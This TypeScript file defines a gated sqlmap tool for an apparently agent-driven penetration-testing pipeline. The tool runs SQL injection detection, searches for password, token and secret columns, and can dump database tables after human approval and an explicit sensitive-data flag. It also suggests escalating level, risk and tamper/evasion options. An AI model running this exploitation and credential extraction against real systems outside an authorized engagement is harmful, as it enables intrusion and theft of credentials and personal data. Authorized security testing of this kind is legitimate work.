import { ToolDefinition, ToolEnvelope, ToolFinding } from "../mcp/types.js";
import { env } from "../env.js";
import { remoteScript, requireRemoteTool, snippet } from "./shared.js";
import { resolveWebScanFromInput } from "./webTarget.js";
import {
  collectTargetHttpUrls,
  quoteShell,
  requireGatedExploitMode,
  runGatedApproval
} from "./exploitGated.js";
import { extractExploitOutputHints, rankSqlmapUrls } from "./outputHints.js";

const SQLMAP_INSTALL = "apt-get update -y && apt-get install -y sqlmap";

/**
 * exploit.sqlmap — gated SQL injection testing on discovered web URLs.
 * Requires human approval. Bounded flags (no os-shell/pwn).
 */
export const sqlmapTool: ToolDefinition = {
  name: "exploit.sqlmap",
  description:
    "Gated SQL injection workflow (sqlmap): detect SQLi, optionally search for credential-like columns, and optionally dump selected columns. Requires Pipeline approval; dumping requires explicit sensitiveOk=true.",
  tags: ["exploit", "web", "gated"],
  requires: ["http_targets"],
  defaultTimeoutMs: 25 * 60 * 1000,
  argSchema: {
    urls: { type: "array", items: { type: "string" }, description: "Target URLs to test (must be on engagement host)" },
    url: { type: "string", description: "Single URL alternative" },
    http_targets: { type: "array", items: { type: "string" }, description: "Alias for urls" },
    level: { type: "number", default: 2, description: "sqlmap --level (1-5)" },
    risk: { type: "number", default: 2, description: "sqlmap --risk (1-3)" },
    tamper: { type: "string", description: "Optional sqlmap --tamper script (e.g. space2comment)" },
    randomAgent: { type: "boolean", description: "Pass --random-agent when true" },
    mode: {
      type: "string",
      description: "detect | search_creds | dump (default detect). dump requires sensitiveOk=true."
    },
    sensitiveOk: {
      type: "boolean",
      description: "Must be true to allow any sqlmap data dumping (PII/secret risk). Default false."
    },
    dump: {
      type: "object",
      description:
        "Only used when mode=dump. Provide db/table and optional columns[]/where/limit. If omitted, tool will only search for credential-like columns and return recommendations."
    }
  },
  handler: async (input, emit): Promise<ToolEnvelope> => {
    const blocked = requireGatedExploitMode("exploit.sqlmap");
    if (blocked) return blocked;
    if (!env.SQLMAP_ENABLED) {
      return {
        status: "skipped",
        error: "exploit.sqlmap is disabled (set SQLMAP_ENABLED=true).",
        artifacts: { commands: [] },
        facts: [],
        findings: [],
        recommendations: [],
        meta: {}
      };
    }

    const webScan = resolveWebScanFromInput(input.target.host, input.target.vhost, input.context?.webScan);
    const urls = collectTargetHttpUrls({
      host: input.target.host,
      vhost: webScan.vhost,
      args: input.args as Record<string, unknown>,
      discoveredEndpoints: input.context?.discoveredEndpoints
    });

    const ranked = rankSqlmapUrls(urls);
    const withParams = ranked.filter((u) => /[?&][^=]+=/.test(u));
    const appPages = ranked.filter(
      (u) => /\.php($|\?)/i.test(u) || /dvwa|mutillidae|login|admin|search|phpmyadmin\/?(index\.php)?$/i.test(u)
    );
    const targets = (withParams.length ? withParams : appPages.length ? appPages : ranked).slice(0, 6);
    if (targets.length === 0) {
      return {
        status: "skipped",
        error:
          "No suitable HTTP(S) URLs for sqlmap (need query params or app pages, not static CSS/JS). Pass urls with ?id=… or run spider/gobuster first.",
        artifacts: { commands: [] },
        facts: [],
        findings: [],
        recommendations: [],
        meta: {}
      };
    }

    const presence = await requireRemoteTool("sqlmap", input.signal, { installCommand: SQLMAP_INSTALL });
    if (presence.missing) return presence.envelope;

    const level = Math.min(5, Math.max(1, Number((input.args as { level?: number })?.level ?? 2)));
    const risk = Math.min(3, Math.max(1, Number((input.args as { risk?: number })?.risk ?? 2)));
    const tamper = String((input.args as { tamper?: string } | undefined)?.tamper ?? "").trim();
    const randomAgent = Boolean((input.args as { randomAgent?: boolean } | undefined)?.randomAgent);
    const modeRaw = String((input.args as { mode?: string } | undefined)?.mode ?? "detect").trim().toLowerCase();
    const mode: "detect" | "search_creds" | "dump" =
      modeRaw === "dump" ? "dump" : modeRaw === "search_creds" ? "search_creds" : "detect";
    const sensitiveOk = Boolean((input.args as { sensitiveOk?: boolean } | undefined)?.sensitiveOk);

    const planned = `sqlmap (${mode}) on ${targets.length} URL(s): ${targets.slice(0, 3).join(", ")}${targets.length > 3 ? "…" : ""}`;

    const approval = await runGatedApproval({
      agentRunId: input.context?.runId,
      tool: "exploit.sqlmap",
      command: planned,
      reasoning:
        input.intent ??
        (mode === "dump"
          ? "SQL injection exploitation: dump selected database columns (sensitive)."
          : mode === "search_creds"
            ? "SQL injection exploitation: search for credential-like columns (no dumping)."
            : "SQL injection testing on discovered web endpoints"),
      impact: "high",
      args: { urls: targets.slice(0, 8), level, risk, mode, sensitiveOk },
      signal: input.signal,
      emitLog: (s) => emit.log(s)
    });
    if (!approval.approved) return approval.envelope;

    const findings: ToolFinding[] = [];
    const facts: ToolEnvelope["facts"] = [];
    const commands: string[] = [];
    let stdoutAll = "";
    const perUrlSummaries: Array<{ url: string; vulnerable: boolean; dbms?: string | null; notes: string[] }> = [];

    const extraFlags: string[] = [];
    if (tamper) extraFlags.push(`--tamper=${quoteShell(tamper)}`);
    if (randomAgent) extraFlags.push("--random-agent");

    const testedUrls = targets.slice(0, 6);
    for (const targetUrl of testedUrls) {
      const outDir = `/tmp/sqlmap_${Date.now()}_$$`;
      const script = [
        "set +e",
        `URL=${quoteShell(targetUrl)}`,
        `OUT=${quoteShell(outDir)}`,
        [
          "sqlmap",
          `-u "$URL"`,
          "--batch",
          `--level=${level}`,
          `--risk=${risk}`,
          "--threads=2",
          "--timeout=15",
          '--answers="crack=Y,continue=Y,quit=N,cookie=Y"',
          "--output-dir=\"$OUT\"",
          "--flush-session",
          ...extraFlags,
          "2>&1"
        ].join(" "),
        `rm -rf "$OUT" 2>/dev/null || true`
      ].join("\n");

      emit.log(`[sqlmap] ${targetUrl}`);
      const r = await remoteScript(script, input.signal, (s) => emit.log(s));
      commands.push(`sqlmap -u ${targetUrl} --level=${level} --risk=${risk}${tamper ? ` --tamper=${tamper}` : ""}`);
      stdoutAll += r.stdout;

      const vulnerable = /is vulnerable|sqlmap identified the following injection|Parameter:/i.test(r.stdout);
      const dbms = /back-end DBMS:\s*([^\n]+)/i.exec(r.stdout)?.[1]?.trim();
      const notes: string[] = [];
      if (/anti-CSRF token/i.test(r.stdout)) notes.push("anti_csrf_token_detected");
      if (/target URL content appears to be too dynamic/i.test(r.stdout)) notes.push("too_dynamic");
      if (/Switching to '--text-only'/i.test(r.stdout)) notes.push("text_only_mode");
      if (/do not appear to be injectable/i.test(r.stdout)) notes.push("not_injectable");
      if (/unable to connect to the target URL/i.test(r.stdout)) notes.push("intermittent_connectivity");
      perUrlSummaries.push({ url: targetUrl, vulnerable, dbms: dbms ?? null, notes });
      if (vulnerable) {
        facts.push({
          type: "sqli",
          value: { url: targetUrl, dbms: dbms ?? null, snippet: snippet(r.stdout, 400) },
          source: "sqlmap"
        });
        findings.push({
          title: `SQL injection likely on ${targetUrl}`,
          severity: "critical",
          evidence: snippet(r.stdout, 500),
          fingerprint: `sqli|${targetUrl}`,
          confidence: "high",
          requiresVerification: false,
          claimType: "sqli"
        });
      }
    }

    if (findings.length === 0) {
      const hints = extractExploitOutputHints("exploit.sqlmap", stdoutAll, {
        level,
        risk,
        mode,
        urls: testedUrls
      });
      facts.push({
        type: "sqlmap_summary",
        value: {
          urlsTested: testedUrls,
          level,
          risk,
          tamper: tamper || null,
          result: "no_injection_detected",
          perUrl: perUrlSummaries,
          plainEnglish:
            hints[0]?.plainEnglish ??
            "No SQLi detected on tested URLs. Prefer endpoints with query parameters (?id=…), not static CSS/JS assets.",
          nextHints: hints.map((h) => h.plainEnglish)
        },
        source: "sqlmap"
      });

      const betterUrls = rankSqlmapUrls([
        ...testedUrls,
        ...(input.context?.discoveredEndpoints ?? []).map((e) => e.url)
      ]).filter((u) => /[?&][^=]+=/.test(u) || /dvwa|mutillidae|\.php\?/i.test(u));

      const nextArgs = {
        mode: "detect" as const,
        level: Math.min(5, level + 1),
        risk: Math.min(3, risk + 1),
        ...(tamper ? { tamper } : hints.some((h) => h.suggestedArgs?.tamper) ? { tamper: "space2comment", randomAgent: true } : {}),
        urls: (betterUrls.length ? betterUrls : testedUrls).slice(0, 6)
      };

      return {
        status: "succeeded",
        facts,
        findings,
        recommendations:
          level < 5
            ? [
                {
                  agent: "exploit.sqlmap",
                  reason:
                    hints[0]?.plainEnglish ??
                    `sqlmap suggested deeper testing — retry at level=${nextArgs.level} risk=${nextArgs.risk} on parameterized URLs`,
                  priority: 88,
                  args: nextArgs
                }
              ]
            : [],
        artifacts: { commands, stdoutSnippet: snippet(stdoutAll, 2000) },
        meta: {
          approvalId: approval.approvalId,
          urlsTested: targets.length,
          sqliFound: 0,
          mode,
          commandSummary: planned,
          outputHints: hints
        }
      };
    }

    // If SQLi is found and mode requires follow-up, prefer the first vulnerable URL.
    const firstVuln = perUrlSummaries.find((s) => s.vulnerable)?.url ?? testedUrls[0]!;

    const credColumnNeedles = ["pass", "password", "passwd", "pwd", "hash", "token", "apikey", "api_key", "secret"];
    const searchCols = credColumnNeedles.join(",");

    if (mode === "search_creds" || mode === "dump") {
      emit.log(`[sqlmap] searching for credential-like columns on ${firstVuln}`);
      const outDir = `/tmp/sqlmap_${Date.now()}_$$`;
      const script = [
        "set +e",
        `URL=${quoteShell(firstVuln)}`,
        `OUT=${quoteShell(outDir)}`,
        [
          "sqlmap",
          `-u "$URL"`,
          "--batch",
          `--level=${level}`,
          `--risk=${risk}`,
          "--threads=2",
          "--timeout=15",
          '--answers="crack=N,continue=N,quit=N"',
          "--output-dir=\"$OUT\"",
          "--flush-session",
          `--search -C ${quoteShell(searchCols)}`,
          "2>&1 || true"
        ].join(" "),
        `rm -rf "$OUT" 2>/dev/null || true`
      ].join("\n");
      const r = await remoteScript(script, input.signal, (s) => emit.log(s));
      stdoutAll += r.stdout;
      commands.push(`sqlmap -u ${firstVuln} --search -C ${searchCols}`);
      facts.push({
        type: "sqlmap_search_creds",
        value: { url: firstVuln, columns: credColumnNeedles, snippet: snippet(r.stdout, 900) },
        source: "sqlmap"
      });
      findings.push({
        title: `SQLi confirmed; searched for credential-like columns on ${firstVuln}`,
        severity: "high",
        evidence: snippet(r.stdout, 600),
        fingerprint: `sqlmap-search-creds|${firstVuln}`,
        confidence: "medium",
        requiresVerification: false,
        claimType: "data_exposure"
      });
    }

    if (mode === "dump") {
      if (!sensitiveOk) {
        return {
          status: "succeeded",
          facts,
          findings,
          recommendations: [
            {
              agent: "exploit.sqlmap",
              reason:
                "Dump mode requested but sensitiveOk=false. Re-run with mode=dump and sensitiveOk=true AND specify dump.db + dump.table (and optional dump.columns) after operator approval.",
              priority: 95,
              args: {
                mode: "dump",
                sensitiveOk: true,
                dump: { db: "<db>", table: "<table>", columns: ["username", "password_hash"] }
              }
            }
          ],
          artifacts: { commands, stdoutSnippet: snippet(stdoutAll, 2000) },
          meta: { approvalId: approval.approvalId, urlsTested: targets.length, sqliFound: findings.length, mode, commandSummary: planned }
        };
      }

      const dumpArgs = (input.args as { dump?: any } | undefined)?.dump ?? null;
      const db = typeof dumpArgs?.db === "string" && dumpArgs.db.trim() ? dumpArgs.db.trim() : null;
      const table = typeof dumpArgs?.table === "string" && dumpArgs.table.trim() ? dumpArgs.table.trim() : null;
      const columns = Array.isArray(dumpArgs?.columns) ? dumpArgs.columns.filter((c: any) => typeof c === "string" && c.trim()).map((c: string) => c.trim()) : [];
      const where = typeof dumpArgs?.where === "string" && dumpArgs.where.trim() ? dumpArgs.where.trim() : null;
      const limit = Number.isFinite(Number(dumpArgs?.limit)) ? Math.max(1, Math.min(5000, Number(dumpArgs.limit))) : null;

      if (!db || !table) {
        return {
          status: "succeeded",
          facts,
          findings,
          recommendations: [
            {
              agent: "exploit.sqlmap",
              reason:
                "To dump data safely, specify dump.db and dump.table (and optionally dump.columns/where/limit). Start with a small limit and specific columns.",
              priority: 96,
              args: {
                mode: "dump",
                sensitiveOk: true,
                dump: { db: "<db>", table: "<users_table>", columns: ["username", "password_hash"], limit: 50 }
              }
            }
          ],
          artifacts: { commands, stdoutSnippet: snippet(stdoutAll, 2000) },
          meta: { approvalId: approval.approvalId, urlsTested: targets.length, sqliFound: findings.length, mode, commandSummary: planned }
        };
      }

      emit.log(`[sqlmap] dumping ${db}.${table} (sensitive)`);
      const outDir = `/tmp/sqlmap_${Date.now()}_$$`;
      const dumpFlags: string[] = [];
      dumpFlags.push(`-D ${quoteShell(db)}`);
      dumpFlags.push(`-T ${quoteShell(table)}`);
      if (columns.length) dumpFlags.push(`-C ${quoteShell(columns.join(","))}`);
      if (where) dumpFlags.push(`--where=${quoteShell(where)}`);
      if (limit) dumpFlags.push(`--start=0 --stop=${limit}`);

      const script = [
        "set +e",
        `URL=${quoteShell(firstVuln)}`,
        `OUT=${quoteShell(outDir)}`,
        [
          "sqlmap",
          `-u "$URL"`,
          "--batch",
          `--level=${level}`,
          `--risk=${risk}`,
          "--threads=2",
          "--timeout=15",
          '--answers="crack=N,continue=N,quit=N"',
          "--output-dir=\"$OUT\"",
          "--flush-session",
          "--dump",
          ...dumpFlags,
          "2>&1 || true"
        ].join(" "),
        `rm -rf "$OUT" 2>/dev/null || true`
      ].join("\n");

      const r = await remoteScript(script, input.signal, (s) => emit.log(s));
      stdoutAll += r.stdout;
      commands.push(`sqlmap -u ${firstVuln} --dump -D ${db} -T ${table}${columns.length ? ` -C ${columns.join(",")}` : ""}`);
      facts.push({
        type: "sqlmap_dump",
        value: { url: firstVuln, db, table, columns: columns.length ? columns : null, where, limit, snippet: snippet(r.stdout, 1200) },
        source: "sqlmap"
      });
      findings.push({
        title: `SQLi data dump executed for ${db}.${table} (sensitive)`,
        severity: "critical",
        evidence: snippet(r.stdout, 800),
        fingerprint: `sqlmap-dump|${firstVuln}|${db}|${table}`,
        confidence: "medium",
        requiresVerification: false,
        claimType: "data_exposure"
      });
    }

    return {
      status: "succeeded",
      facts,
      findings,
      recommendations: findings.length
        ? [{ agent: "exploit.commix", reason: "SQLi found — check same host for command injection vectors", priority: 70 }]
        : [],
      artifacts: { commands, stdoutSnippet: snippet(stdoutAll, 2000) },
      meta: { approvalId: approval.approvalId, urlsTested: targets.length, sqliFound: findings.length, mode, commandSummary: planned }
    };
  }
};
